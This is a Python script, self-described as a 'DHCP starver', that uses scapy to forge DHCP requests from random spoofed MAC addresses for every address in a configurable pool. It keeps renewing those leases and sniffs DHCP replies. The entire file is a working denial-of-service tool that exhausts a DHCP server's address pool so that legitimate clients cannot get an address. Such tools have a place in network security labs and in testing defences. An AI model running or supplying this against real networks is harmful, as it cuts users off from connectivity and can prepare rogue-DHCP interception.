import time
import ipaddress
from argparse import ArgumentParser

from scapy.all import BOOTP, DHCP, Ether, IP, UDP
import scapy.volatile
import scapy.sendrecv
import scapy.layers.dhcp


def request(interface, ip, mac, lease_time):
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("requested_addr", ip),
                ("lease_time", lease_time),
                "end",
            ]
        )
    )
    scapy.sendrecv.sendp(pkt, iface=interface, verbose=False)

def release(interface, ip, mac):
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac, ciaddr=ip)
        / DHCP(
            options=[
                ("message-type", "release"),
                "end",
            ]
        )
    )
    scapy.sendrecv.sendp(pkt, iface=interface, verbose=False)


def sniff(pkt):
    if DHCP not in pkt:
        return
    options_dict = {op[0]: op[1] for op in pkt[DHCP].options if isinstance(op, tuple)}
    options_dict["message-type"] = scapy.layers.dhcp.DHCPTypes[
        options_dict["message-type"]
    ]
    print(
        f'DHCP {options_dict["message-type"].upper()}',
        f"MAC: {pkt[Ether].src:>17} -> {pkt[Ether].dst}",
        f"IP : {pkt[IP].src:>17} -> {pkt[IP].dst}",
        *(f"{k}: {v}" for k, v in options_dict.items() if k != "message-type"),
        sep="\n",
        end="\n\n",
    )


def ip_range(start, end):
    start = ipaddress.IPv4Address(start)
    end = ipaddress.IPv4Address(end)
    for ip in range(int(start), int(end) + 1):
        yield ipaddress.IPv4Address(ip)


def main():
    parser = ArgumentParser(description="DHCP starver")
    parser.add_argument("--interface", default="eth0")
    parser.add_argument(
        "--pool-start",
        type=ipaddress.IPv4Address,
        default=ipaddress.IPv4Address("192.168.0.2"),
    )
    parser.add_argument(
        "--pool-end",
        type=ipaddress.IPv4Address,
        default=ipaddress.IPv4Address("192.168.0.255"),
    )
    parser.add_argument("--lease-time", type=int, default=600)
    args = parser.parse_args()

    pool = [
        (ip, str(scapy.volatile.RandMAC()))
        for ip in ip_range(args.pool_start, args.pool_end)
    ]

    sniffer = scapy.sendrecv.AsyncSniffer(
        filter="udp and (port 67 or port 68)", prn=sniff, store=0, iface=args.interface
    )
    sniffer.start()

    try:
        while True:
            print("Sending requests")
            for ip, mac in pool:
                request(args.interface, ip, mac, args.lease_time)
                time.sleep(1)
            time.sleep(args.lease_time / 2)
    except KeyboardInterrupt:
        print("Graceful shutdown")
        for ip, mac in pool:
            release(args.interface, ip, mac)
            time.sleep(.5)
    except Exception as e:
        print(e)
    finally:
        sniffer.stop(join=True)


if __name__ == "__main__":
    main()
